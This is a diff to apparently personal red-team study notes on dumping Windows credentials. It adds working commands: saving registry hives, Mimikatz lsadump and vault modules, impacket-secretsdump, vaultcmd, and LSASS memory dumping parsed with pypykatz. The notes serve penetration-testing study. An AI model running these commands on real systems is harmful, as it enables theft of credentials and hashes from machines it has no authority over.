@@ -157,6 +157,8 @@ $ hashcat -m 22100 myhash wordlist
 
 [![password_attacks](../../../cybersecurity/_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
 
+* **Dump SAM database and other hives**
+
 If you have enough privileges to access the registry <small>(not necessarily admin, but not a normal user)</small>, you can dump the three hives:
 
 ```ps
@@ -166,15 +168,30 @@ PS> reg save hklm\security C:\XXX\security.hive
 $ nxc smb IP --local-auth -u xxx -p yyy --sam # remote dump
 ```
 
+* **Analysis** on Windows with [Mimikatz](/cybersecurity/red-team/tools/utilities/creds/mimikatz.md)
+
+```shell!
+mimikatz# lsadump::sam /system:./system.hive /sam:./sam.hive
+mimikatz# lsadump::sam /system:./system.hive /sam:./sam.hive /security:./security.hive
+```
+
+* **Analysis of dumped database** on Linux
+
 Use [file transfer methods](/cybersecurity/red-team/_knowledge/topics/file_transfer.md) such as SMB and [secretsdump](/operating-systems/networking/protocols/tools/impacket.md) to dump them. We would then try to [crack](/cybersecurity/cryptography/algorithms/hashing/index.md#hash-cracking) or pass the hash.
 
 ```shell!
 $ impacket-secretsdump -sam sam.hive -security security.hive -system system.hive LOCAL
 ```
 
-#### Dump Credentials From The Credential Manager
+#### Dump Credentials Protected By the DPAPI
 
 [![dpapi_extracting_passwords](../../../cybersecurity/_badges/hacktricks/windows_hardening/windows_local_privilege_escalation/dpapi_extracting_passwords.svg)](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords)
+
+...
+
+</div><div>
+
+#### Dump Credentials From The Credential Manager
 
 Windows has a feature called [credential manager](https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication) used by apps to store credentials. Each user has one usually stored in `%appdata%\Local\Microsoft\Credentials\`.
 
@@ -185,19 +202,25 @@ PS> vaultcmd /list
 PS> vaultcmd /listcreds:"Web Credentials" /all
 PS> vaultcmd /listcreds:"Windows Credentials" /all
 ```
-</div><div>
+
+You can also use [Mimikatz](/cybersecurity/red-team/tools/utilities/creds/mimikatz.md):
+
+```shell!
+mimikatz# vault::list
+mimikatz# vault::cred
+```
 
 #### Dump Credentials From LSASS process
 
 [![password_attacks](../../../cybersecurity/_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
 
-The LSASS process that contains the credential manager masterkey  for the logged user. It can be used to decrypt credentials for applications that use it. It also contains tickets, and [wDIGEST](https://learn.microsoft.com/en-us/windows/win32/secauthn/microsoft-digest-authentication) cleartext credentials.
+The LSASS process that contains the DPAPI masterkey for the logged user. It can be used to decrypt credentials for applications that use it. It also contains tickets, and [wDIGEST](https://learn.microsoft.com/en-us/windows/win32/secauthn/microsoft-digest-authentication) cleartext credentials.
 
-##### Dump using Mimikatz
+* **Dump and Analysis** on Windows with [Mimikatz](/cybersecurity/red-team/tools/utilities/creds/mimikatz.md)
 
-Refer to the [Mimikatz](/cybersecurity/red-team/tools/utilities/creds/mimikatz.md) notes for usage. See also: [pass-the-xxx](/cybersecurity/red-team/s4.privesc/index.md#pass-the-xxx).
-
-##### Dump and analyze it on Linux with pypykatz
+```shell!
+mimikatz# lsadump::lsa /patch
+```
 
 * **Dump LSA Process Memory** <small>(Admin Shell Required/No Admin for TM?)</small>
 
@@ -218,7 +241,7 @@ $ nxc smb IP --local-auth -u xxx -p yyy --lsa # remote dump
 
 Lastly, you can also open the task manager, right-click on the LSAP process and select 'Create dump file.'
 
-* **Analyzing LSA Process Dump** on Linux using [pypykatz](https://github.com/skelsec/pypykatz) <small>(2.6k ⭐)</small>
+* **Analyzing LSA Process Dump** on Linux using [pypykatz](/cybersecurity/red-team/tools/utilities/creds/pypykatz.md)
 
 ```shell!
 $ pypykatz lsa minidump lsass.dmp
